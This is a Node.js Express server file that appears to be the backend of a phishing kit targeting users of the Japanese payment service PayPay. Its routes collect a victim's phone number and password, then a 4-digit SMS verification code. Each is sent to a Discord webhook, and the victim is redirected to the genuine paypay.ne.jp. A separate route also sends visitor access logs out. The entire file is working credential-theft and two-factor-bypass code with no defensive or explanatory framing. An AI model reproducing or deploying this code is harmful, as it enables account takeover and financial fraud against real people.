const express = require("express");
const app = express();
const { getAccessLog } = require("./access.js");

app.use(express.urlencoded({ extended: true }));
app.use(express.static("."));

const webhook = process.env.DISCORD_WEBHOOK;

app.post("/send", async (req, res) => {
  const phone = req.body.name;
  const password = req.body.message;

  const safePhone = typeof phone === 'string' ? phone : '';
  const safePassword = typeof password === 'string' ? password : '';
  const cleanPhone = safePhone.replace(/[- ]/g, '');

  if (!/^(090|080|070|060)/.test(cleanPhone) || !/[A-Z]/.test(safePassword)) {
    return res.redirect("/login.html?error=1");
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `\ntel: ${phone}\npass: ${password}`
      })
    });

    console.log("ログイン情報 送信成功");

    const telParam = phone ? `?tel=${encodeURIComponent(phone)}` : '';
    res.redirect(`/sms.html${telParam}`);

  } catch (error) {
    console.error("送信失敗:", error);
    res.status(500).send("エラー");
  }
});


app.post("/send-sms", async (req, res) => {
  const smsCode = req.body.sms_code;
  const safeCode = typeof smsCode === 'string' ? smsCode : '';

  if (!/^\d{4}$/.test(safeCode)) {
    return res.redirect("/sms.html?error=1");
  }

  try {
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        content: `\nsms: ${safeCode}`
      })
    });

    console.log("SMSコード 送信成功");
    
    res.redirect("https://paypay.ne.jp"); 

  } catch (error) {
    console.error("SMSコード送信失敗:", error);
    res.status(500).send("エラー");
  }
});
app.post("/log-access", async (req, res) => {

  const accessWebhook = process.env.ACCESS_WEBHOOK || process.env.DISCORD_WEBHOOK;

  try {
    const logMessage = await getAccessLog(req, req.body);

    await fetch(accessWebhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: logMessage })
    });

    res.status(200).send("OK");
  } catch (error) {
    console.error("アクセスログ送信失敗:", error);
    res.status(500).send("Error");
  }
});



app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
